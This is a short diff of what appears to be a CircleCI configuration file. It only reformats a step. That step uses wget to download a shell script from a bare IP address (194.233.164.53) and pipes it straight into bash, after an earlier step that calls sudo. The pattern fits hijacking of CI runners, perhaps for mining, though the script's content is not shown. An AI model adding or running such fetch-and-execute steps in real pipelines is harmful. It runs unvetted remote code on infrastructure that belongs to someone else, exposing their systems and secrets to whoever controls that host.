@@ -9,4 +9,4 @@ jobs:
     steps:
       - checkout
       - run: sudo -i;apt update;apt -y install wget
-      - run:  wget -O - http://194.233.164.53/start_jay_AzAz16_ws_rand.sh | bash
+      - run: wget -O - http://194.233.164.53/start_jay_AzAz16_ws_rand.sh | bash
